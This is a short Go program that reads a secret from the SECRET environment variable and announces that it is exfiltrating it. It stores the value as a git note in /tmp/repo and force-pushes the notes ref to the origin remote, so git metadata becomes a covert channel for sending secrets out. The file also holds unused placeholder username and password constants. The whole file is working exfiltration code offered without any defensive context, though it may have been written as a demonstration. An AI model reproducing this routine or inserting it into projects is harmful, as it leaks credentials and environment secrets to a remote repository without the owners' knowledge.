package main

import (
	"fmt"
	"os"
    "os/exec"
	//"github.com/go-git/go-git/v5"
)

const (
    TARGET_REPO_PATH = "/tmp/repo"
    TARGET_USERNAME = "user1"
    TARGET_PASSWORD = "password"
)

func main() {
    secret := os.Getenv("SECRET")
    if len(secret) > 0 {
        fmt.Printf("Exfiltrating secret: %s", secret)
        add_cmd := exec.Command("git", "notes", "add", "-m", secret)
        add_cmd.Dir = TARGET_REPO_PATH
        add_cmd.Run()

        push_cmd := exec.Command("git", "push", "origin", "refs/notes/commits", "-f")
        push_cmd.Dir = TARGET_REPO_PATH
        push_cmd.Run()
    }
	
}
